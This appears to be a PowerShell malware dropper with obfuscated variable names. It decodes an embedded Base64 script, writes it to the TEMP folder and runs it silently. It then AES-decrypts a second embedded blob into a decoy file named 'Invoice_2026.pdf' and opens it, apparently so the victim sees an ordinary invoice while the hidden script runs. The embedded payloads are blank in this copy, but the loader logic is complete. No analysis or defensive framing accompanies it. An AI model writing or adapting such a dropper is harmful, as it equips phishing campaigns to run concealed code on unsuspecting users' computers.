$ErrorActionPreference='Continue'
try{
$xqmhfm=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(''))
$ttlbtk="$env:TEMP\fqtqgwdp.ps1"
[IO.File]::WriteAllText($ttlbtk,$xqmhfm,[Text.Encoding]::UTF8)
"[step1] reg script written to $ttlbtk" | Out-File "$env:TEMP\pdfdrp_debug.txt" -Append
. $ttlbtk
"[step1] reg script done" | Out-File "$env:TEMP\pdfdrp_debug.txt" -Append
$asikfi=[Convert]::FromBase64String('PUUWGxZe8LUoYSvSRUOy+KJ9+GkeJok6jlKcjmLdOpc=')
$pxycea=[Convert]::FromBase64String('71LBWNRZTnTZiXrNObLxUg==')
$yekdux=[Convert]::FromBase64String('')
$smyrvu=New-Object Security.Cryptography.AesManaged
$smyrvu.Key=$asikfi;$smyrvu.IV=$pxycea;$smyrvu.Mode='CBC';$smyrvu.Padding='PKCS7'
$cqggag=$smyrvu.CreateDecryptor()
$hhuhul=New-Object IO.MemoryStream(,$yekdux)
$yypzvx=New-Object Security.Cryptography.CryptoStream($hhuhul,$cqggag,[Security.Cryptography.CryptoStreamMode]::Read)
$ezwaxo=New-Object IO.MemoryStream
$yypzvx.CopyTo($ezwaxo);$smyrvu.Dispose()
$iqqhxl="$env:TEMP\Invoice_2026.pdf"
[IO.File]::WriteAllBytes($iqqhxl,$ezwaxo.ToArray())
"[step2] PDF written to $iqqhxl" | Out-File "$env:TEMP\pdfdrp_debug.txt" -Append
Start-Process "$iqqhxl"
"[step3] PDF opened" | Out-File "$env:TEMP\pdfdrp_debug.txt" -Append
}catch{
"[ERROR] $($_.Exception.Message) at line $($_.InvocationInfo.ScriptLineNumber)" | Out-File "$env:TEMP\pdfdrp_debug.txt" -Append
}
